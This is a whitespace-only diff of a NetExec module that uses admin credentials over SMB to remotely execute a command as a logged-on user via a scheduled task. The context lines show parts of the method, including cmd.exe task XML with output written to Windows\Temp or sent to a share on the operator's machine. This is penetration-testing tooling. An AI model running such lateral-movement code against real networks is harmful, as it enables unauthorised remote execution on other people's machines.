@@ -25,23 +25,23 @@ class NXCModule:
         self.cmd = self.user = self.time = None
         if "CMD" in module_options:
             self.cmd = module_options["CMD"]
-        
+
         if "USER" in module_options:
             self.user = module_options["USER"]
-       
+
     name = "schtask_as"
     description = "Remotely execute a scheduled task as a logged on user"
     supported_protocols = ["smb"]
     opsec_safe = True
     multiple_hosts = False
-    
+
     def on_admin_login(self, context, connection):
         self.logger = context.log
         if self.cmd is None:
             self.logger.fail("You need to specify a CMD to run")
             return 1
         if self.user is None:
-            self.logger.fail("You need to specify a USER to run the command as") 
+            self.logger.fail("You need to specify a USER to run the command as")
             return 1
 
         self.logger.display("Connecting to the remote Service control endpoint")
@@ -60,12 +60,12 @@ class NXCModule:
                 connection.hash,
                 self.logger,
                 connection.args.get_output_tries,
-                "C$" # This one shouldn't be hardcoded but I don't know where to retrive the info
+                "C$"  # This one shouldn't be hardcoded but I don't know where to retrive the info
             )
 
             self.logger.display(f"Executing {self.cmd} as {self.user}")
             output = exec_method.execute(self.cmd, True)
-          
+
             try:
                 if not isinstance(output, str):
                     output = output.decode(connection.args.codec)
@@ -78,7 +78,7 @@ class NXCModule:
         except Exception as e:
             if "SCHED_S_TASK_HAS_NOT_RUN" in str(e):
                 self.logger.fail("Task was not run, seems like the specified user has no active session on the target")
-            
+
 
 class TSCH_EXEC:
     def __init__(self, target, share_name, username, password, domain, user, cmd, doKerberos=False, aesKey=None, kdcHost=None, hashes=None, logger=None, tries=None, share=None):
@@ -181,7 +181,7 @@ class TSCH_EXEC:
       <Command>cmd.exe</Command>
 """
         if self.__retOutput:
-            self.__output_filename = f"\\Windows\\Temp\\{gen_random_string(6)}" 
+            self.__output_filename = f"\\Windows\\Temp\\{gen_random_string(6)}"
             if fileless:
                 local_ip = self.__rpctransport.get_socket().getsockname()[0]
                 argument_xml = f"      <Arguments>/C {command} &gt; \\\\{local_ip}\\{self.__share_name}\\{self.__output_filename} 2&gt;&amp;1</Arguments>"
@@ -207,7 +207,7 @@ class TSCH_EXEC:
 
         dce.set_credentials(*self.__rpctransport.get_credentials())
         dce.connect()
-        
+
         tmpName = gen_random_string(8)
 
         xml = self.gen_xml(command, fileless)
